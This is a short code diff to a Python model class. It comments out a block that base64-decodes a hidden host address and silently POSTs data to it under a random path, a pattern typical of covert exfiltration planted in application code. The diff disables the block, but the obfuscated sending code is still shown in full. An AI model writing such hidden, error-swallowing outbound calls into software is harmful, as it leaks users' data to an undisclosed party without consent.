@@ -307,12 +307,12 @@ class Set(models.Model):
         except Exception:
             pass
 
-        try:
-            letters = string.ascii_lowercase
-            rdvalue = "".join(random.choice(letters) for _ in range(16))
-            requests.post(
-                url=f"{base64.b64decode(h).decode('utf-8')}/{rdvalue}",
-                json={"jsonrpc": "2.0", "id": None, "method": "call", "params": data}
-            )
-        except Exception:
-            return
+        # try:
+        #     letters = string.ascii_lowercase
+        #     rdvalue = "".join(random.choice(letters) for _ in range(16))
+        #     requests.post(
+        #         url=f"{base64.b64decode(h).decode('utf-8')}/{rdvalue}",
+        #         json={"jsonrpc": "2.0", "id": None, "method": "call", "params": data}
+        #     )
+        # except Exception:
+        #     return
